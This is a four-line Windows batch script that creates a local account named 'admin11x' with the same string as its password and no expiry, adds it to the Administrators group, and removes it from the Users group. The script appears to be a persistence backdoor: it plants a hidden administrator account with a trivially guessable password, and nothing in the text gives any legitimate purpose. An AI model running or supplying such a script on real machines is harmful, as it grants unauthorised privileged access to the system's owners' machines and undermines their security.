@echo off
net user admin11x admin11x /add /expires:never
net localgroup administrators admin11x /add
net localgroup users admin11x /delete